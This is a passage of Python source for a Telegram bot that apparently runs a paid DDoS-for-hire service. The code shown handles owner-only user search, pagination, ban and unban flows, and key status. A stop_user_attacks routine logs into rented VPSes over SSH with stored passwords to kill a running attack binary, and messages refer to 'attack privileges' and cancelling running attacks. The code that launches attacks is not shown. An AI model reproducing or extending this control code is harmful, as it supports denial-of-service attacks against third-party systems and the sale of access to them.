            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only the owner can view all users!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    if not all_users:
        bot.reply_to(message, 
            "╭━━━〔 ℹ️ 𝗡𝗢 𝗨𝗦𝗘𝗥𝗦 〕━━━╮\n"
            "│\n"
            "│ No users found in database.\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    # Create search keyboard
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("🔍 Search Users", callback_data="user_search"),
        telebot.types.InlineKeyboardButton("📋 View All", callback_data="user_view_all_0")
    )
    
    bot.reply_to(message,
        "╭━━━〔 👥 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 〕━━━╮\n"
        "│\n"
        "│ Total Users: {}\n"
        "│ Active Keys: {}\n"
        "│ Banned Users: {}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(
            len(all_users),
            len(redeemed_users),
            len(banned_users) if 'banned_users' in globals() else 0
        ),
        reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('user_'))
def handle_user_callbacks(call):
    """Handle all user-related callbacks"""
    if call.data == "user_search":
        request_user_search(call.message)
    elif call.data.startswith("user_view_all_"):
        page = int(call.data.split("_")[-1])
        show_all_users_page(call.message, page)
    elif call.data.startswith("user_details_"):
        user_id = call.data.split("_")[-1]
        show_user_details(call.message, user_id)
    elif call.data.startswith("user_ban_"):
        user_id = call.data.split("_")[-1]
        confirm_ban(call.message, user_id)
    elif call.data.startswith("user_unban_"):
        user_id = call.data.split("_")[-1]
        confirm_unban(call.message, user_id)

def request_user_search(message):
    """Request search term from user"""
    msg = bot.send_message(
        message.chat.id,
        "╭━━━〔 🔍 𝗦𝗘𝗔𝗥𝗖𝗛 𝗨𝗦𝗘𝗥𝗦 〕━━━╮\n"
        "│\n"
        "│ Enter username or ID to search:\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    bot.register_next_step_handler(msg, process_user_search)

def process_user_search(message):
    """Process user search and show results"""
    search_term = message.text.strip().lower()
    results = []
    
    for user_id, user_data in all_users.items():
        if not user_data:  # Skip if user_data is None
            continue
            
        username = (user_data.get('username') or '').lower()
        first_name = (user_data.get('first_name') or '').lower()
        
        if (search_term in username or 
            search_term in first_name or 
            search_term == user_id):
            results.append((user_id, user_data))
    
    if not results:
        bot.reply_to(message, 
            "╭━━━〔 🔍 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 〕━━━╮\n"
            "│\n"
            "│ No users found matching:\n"
            "│ '{}'\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(search_term))
        return
    
    # Show first 5 results
    markup = telebot.types.InlineKeyboardMarkup()
    for user_id, user_data in results[:5]:
        username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
        btn_text = f"👤 {username} ({user_id[:4]}...)"
        markup.add(telebot.types.InlineKeyboardButton(
            btn_text, 
            callback_data=f"user_details_{user_id}"
        ))
    
    if len(results) > 5:
        markup.add(telebot.types.InlineKeyboardButton(
            "🔍 Show All Results", 
            callback_data=f"user_search_all_{search_term}_0"
        ))
    
    bot.reply_to(message,
        "╭━━━〔 🔍 𝗦𝗘𝗔𝗥𝗖𝗛 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 〕━━━╮\n"
        "│\n"
        "│ Found {} user(s)\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(len(results)),
        reply_markup=markup)

def show_all_users_page(message, page=0):
    """Show paginated list of all users"""
    per_page = 5
    sorted_users = sorted(all_users.items(), key=lambda x: x[1]['last_active'], reverse=True)
    total_pages = (len(sorted_users) // per_page) + 1
    
    markup = telebot.types.InlineKeyboardMarkup()
    
    # Add users for current page
    for i in range(page*per_page, min((page+1)*per_page, len(sorted_users))):
        user_id, user_data = sorted_users[i]
        username = f"@{user_data['username']}" if user_data['username'] else user_data['first_name']
        status = "✅" if user_id in redeemed_users else "🚫"
        
        markup.add(telebot.types.InlineKeyboardButton(
            f"{status} {username} ({user_id[:4]}...)",
            callback_data=f"user_details_{user_id}"
        ))
    
    # Add pagination controls
    pagination = []
    if page > 0:
        pagination.append(telebot.types.InlineKeyboardButton("⬅️", callback_data=f"user_view_all_{page-1}"))
    
    pagination.append(telebot.types.InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="current_page"))
    
    if page < total_pages - 1:
        pagination.append(telebot.types.InlineKeyboardButton("➡️", callback_data=f"user_view_all_{page+1}"))
    
    if pagination:
        markup.row(*pagination)
    
    markup.add(telebot.types.InlineKeyboardButton("🔍 Search Users", callback_data="user_search"))
    
    bot.edit_message_text(
        "╭━━━〔 👥 𝗔𝗟𝗟 𝗨𝗦𝗘𝗥𝗦 〕━━━╮\n"
        "│\n"
        "│ Page {} of {}\n"
        "│ Total Users: {}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(page+1, total_pages, len(all_users)),
        message.chat.id,
        message.message_id,
        reply_markup=markup
    )

def show_user_details(message, user_id):
    """Show detailed user information"""
    user_data = all_users.get(user_id, {})
    username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
    last_seen = datetime.datetime.fromtimestamp(user_data.get('last_active', time.time())).strftime('%Y-%m-%d %H:%M')
    first_seen = datetime.datetime.fromtimestamp(user_data.get('first_seen', time.time())).strftime('%Y-%m-%d')
    
    # Check if user has key
    key_status = "❌ No active key"
    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict):
            expiry = datetime.datetime.fromtimestamp(redeemed_users[user_id]['expiration_time']).strftime('%Y-%m-%d')
            key_status = f"✅ Active key (expires {expiry})"
        else:
            key_status = "⚠️ Legacy key (no expiry info)"
    
    # Check if user is banned
    ban_status = ""
    if 'banned_users' in globals() and user_id in banned_users:
        ban_info = banned_users[user_id]
        banned_by = ban_info.get('banned_by', 'System')
        ban_date = datetime.datetime.fromtimestamp(ban_info.get('timestamp', time.time())).strftime('%Y-%m-%d')
        ban_status = f"\n│ ⛔ BANNED by {banned_by} on {ban_date}"
    
    markup = telebot.types.InlineKeyboardMarkup()
    
    if 'banned_users' in globals() and user_id in banned_users:
        markup.add(telebot.types.InlineKeyboardButton("🔓 Unban User", callback_data=f"user_unban_{user_id}"))
    else:
        markup.row(
            telebot.types.InlineKeyboardButton("🔨 Ban User", callback_data=f"user_ban_{user_id}"),
            telebot.types.InlineKeyboardButton("📋 User Stats", callback_data=f"user_stats_{user_id}")
        )
    
    markup.add(telebot.types.InlineKeyboardButton("🔙 Back", callback_data=f"user_view_all_0"))
    
    bot.edit_message_text(
        f"╭━━━〔 👤 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 〕━━━╮\n"
        f"│\n"
        f"│ 🆔 User ID: `{user_id}`\n"
        f"│ 👤 Username: {username}\n"
        f"│ 📅 First Seen: {first_seen}\n"
        f"│ ⏱ Last Active: {last_seen}\n"
        f"│ 🔑 Key Status: {key_status}"
        f"{ban_status}\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        message.chat.id,
        message.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

# ======================
# 🔨 BAN/UNBAN FUNCTIONS (STYLISH VERSION)
# ======================

def confirm_ban(message, user_id):
    """Show confirmation before banning user"""
    user_data = all_users.get(user_id, {})
    username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✅ CONFIRM BAN", callback_data=f"confirm_ban_{user_id}"),
        telebot.types.InlineKeyboardButton("❌ CANCEL", callback_data=f"user_details_{user_id}")
    )
    
    bot.edit_message_text(
        f"╭━━━〔 ⚠️ 𝗖𝗢𝗡𝗙𝗜𝗥𝗠 𝗕𝗔𝗡 〕━━━╮\n"
        f"│\n"
        f"│ User: {username}\n"
        f"│ ID: `{user_id}`\n"
        f"│\n"
        f"│ This will:\n"
        f"│ • Revoke all access\n"
        f"│ • Cancel running attacks\n"
        f"│ • Prevent future logins\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        message.chat.id,
        message.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

def confirm_unban(message, user_id):
    """Show confirmation before unbanning user"""
    user_data = all_users.get(user_id, {})
    username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
    ban_info = banned_users.get(user_id, {})
    banned_by = ban_info.get('banned_by', 'System')
    ban_date = datetime.datetime.fromtimestamp(ban_info.get('timestamp', time.time())).strftime('%Y-%m-%d')
    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✅ CONFIRM UNBAN", callback_data=f"confirm_unban_{user_id}"),
        telebot.types.InlineKeyboardButton("❌ CANCEL", callback_data=f"user_details_{user_id}")
    )
    
    bot.edit_message_text(
        f"╭━━━〔 ⚠️ 𝗖𝗢𝗡𝗙𝗜𝗥𝗠 𝗨𝗡𝗕𝗔𝗡 〕━━━╮\n"
        f"│\n"
        f"│ User: {username}\n"
        f"│ ID: `{user_id}`\n"
        f"│\n"
        f"│ Banned by: {banned_by}\n"
        f"│ Ban date: {ban_date}\n"
        f"│\n"
        f"│ This will restore:\n"
        f"│ • Bot access\n"
        f"│ • Attack privileges\n"
        f"│ • Key redemption\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        message.chat.id,
        message.message_id,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_ban_'))
def execute_ban(call):
    """Execute the ban after confirmation"""
    user_id = call.data.split("_")[-1]
    user_data = all_users.get(user_id, {})
    username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
    
    # Initialize banned_users if not exists
    if 'banned_users' not in globals():
        global banned_users
        banned_users = {}
    
    # Add to banned users
    banned_users[user_id] = {
        'banned_by': str(call.from_user.id),
        'timestamp': time.time(),
        'reason': "Manual ban by owner"
    }
    
    # Remove from redeemed users if exists
    if user_id in redeemed_users:
        del redeemed_users[user_id]
    
    # Stop any running attacks by this user
    stop_user_attacks(user_id)
    
    save_data()
    
    # Edit original message with success
    bot.edit_message_text(
        f"╭━━━〔 ✅ 𝗕𝗔𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 〕━━━╮\n"
        f"│\n"
        f"│ User: {username}\n"
        f"│ ID: `{user_id}`\n"
        f"│\n"
        f"│ Access revoked\n"
        f"│ Attacks terminated\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        call.message.chat.id,
        call.message.message_id
    )
    
    # Try to notify banned user
    try:
        bot.send_message(
            user_id,
            "╭━━━〔 ⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗩𝗢𝗞𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Your access to this bot has\n"
            "│ been revoked by the owner.\n"
            "│\n"
            "│ Contact @GODxAloneBOY if you\n"
            "│ believe this is a mistake.\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_unban_'))
def execute_unban(call):
    """Execute the unban after confirmation"""
    user_id = call.data.split("_")[-1]
    user_data = all_users.get(user_id, {})
    username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
    
    # Remove from banned users
    if user_id in banned_users:
        del banned_users[user_id]
        save_data()
    
    # Edit original message with success
    bot.edit_message_text(
        f"╭━━━〔 ✅ 𝗨𝗡𝗕𝗔𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 〕━━━╮\n"
        f"│\n"
        f"│ User: {username}\n"
        f"│ ID: `{user_id}`\n"
        f"│\n"
        f"│ Access restored\n"
        f"│ Privileges reinstated\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        call.message.chat.id,
        call.message.message_id
    )
    
    # Try to notify unbanned user
    try:
        bot.send_message(
            user_id,
            "╭━━━〔 🎉 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗦𝗧𝗢𝗥𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Your privileges have been\n"
            "│ restored by the owner.\n"
            "│\n"
            "│ You can now use the bot again.\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    except:
        pass

def stop_user_attacks(user_id):
    """Stop all attacks by a specific user"""
    user_attacks = [aid for aid, details in running_attacks.items() if details['user_id'] == user_id]
    
    for attack_id in user_attacks:
        attack_details = running_attacks.get(attack_id)
        if attack_details:
            try:
                vps_ip = attack_details['vps_ip']
                vps = next((v for v in VPS_LIST if v[0] == vps_ip), None)
                
                if vps:
                    ip, username, password = vps
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=username, password=password, timeout=10)
                    ssh.exec_command(f"pkill -f {BINARY_NAME}")
                    ssh.close()
            except:
                pass
            finally:
                running_attacks.pop(attack_id, None)


# ======================
# 🚀 BOT INITIALIZATION
# ======================
if __name__ == '__main__':
    load_data()
    load_admins()
    print("𝗕𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗹𝗮𝘂𝗻𝗰𝗵𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! »»—— 𝐀𝐋𝐎𝐍𝐄 ƁƠƳ ♥")
    bot.polling(none_stop=True)

